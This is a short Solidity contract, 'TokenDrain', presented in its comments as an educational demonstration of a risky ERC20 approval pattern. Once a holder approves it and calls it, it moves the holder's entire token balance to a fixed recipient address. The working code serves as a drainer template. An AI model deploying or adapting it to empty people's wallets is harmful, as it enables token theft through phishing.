// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title TokenDrain
 * @notice This contract demonstrates a dangerous approval pattern
 * where approving gives permission to drain entire token balance
 * 
 * WARNING: This is for educational purposes only!
 * Never approve contracts you don't fully trust.
 */
contract TokenDrain {
    address public immutable recipient;
    address public owner;

    event BalanceDrained(
        address indexed token,
        address indexed from,
        address indexed to,
        uint256 amount
    );

    constructor(address _recipient) {
        recipient = _recipient;
        owner = msg.sender;
    }

    /**
     * @notice Transfers entire token balance from caller to recipient
     * @dev Requires prior approval of this contract for token spending
     * @param token The ERC20 token address
     */
    function drainAllBalance(address token) external returns (uint256) {
        require(token != address(0), "Invalid token address");
        
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        require(balance > 0, "No balance to drain");

        bool success = IERC20(token).transferFrom(msg.sender, recipient, balance);
        require(success, "Token transfer failed");

        emit BalanceDrained(token, msg.sender, recipient, balance);
        return balance;
    }

    /**
     * @notice Transfers specific amount of tokens to recipient
     * @dev Requires prior approval of this contract for token spending
     * @param token The ERC20 token address
     * @param amount Amount to transfer
     */
    function transferTokens(address token, uint256 amount) external returns (bool) {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");

        bool success = IERC20(token).transferFrom(msg.sender, recipient, amount);
        require(success, "Token transfer failed");

        emit BalanceDrained(token, msg.sender, recipient, amount);
        return true;
    }

    /**
     * @notice Get the current recipient address
     */
    function getRecipient() external view returns (address) {
        return recipient;
    }

    /**
     * @notice Emergency function: owner can withdraw any tokens stuck in contract
     */
    function emergencyWithdraw(address token) external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }
}
